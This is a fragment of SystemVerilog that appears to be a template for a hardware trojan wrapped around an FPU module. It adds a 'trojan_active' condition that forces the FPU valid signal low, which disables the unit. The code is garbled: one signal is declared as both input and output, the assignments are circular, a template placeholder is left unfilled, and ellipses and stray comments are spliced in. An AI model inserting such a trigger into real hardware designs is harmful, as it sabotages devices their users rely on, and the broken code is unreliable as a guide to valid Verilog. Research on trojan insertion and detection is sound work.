...
module fpu_wrap_trojan (
    input  logic clk_i,
    input  logic rst_ni,
    
    // Original module signals (passthrough)
    input  logic fpu_valid_i,
    output logic fpu_valid_i,
    ...
    assign fpu_valid_i = trojan_active ? 1'b0 : fpu_valid_i_normal;
    ...
    logic fpu_valid_i_normal;
    logic {{PAYLOAD_SIGNAL_2}}_normal;
    
    assign fpu_valid_i_normal = fpu_valid_i;
 ...
 *     input  logic instr_valid_i,   // fpu_valid_i
 *     output logic instr_valid_o    // fpu_valid_i
 * );
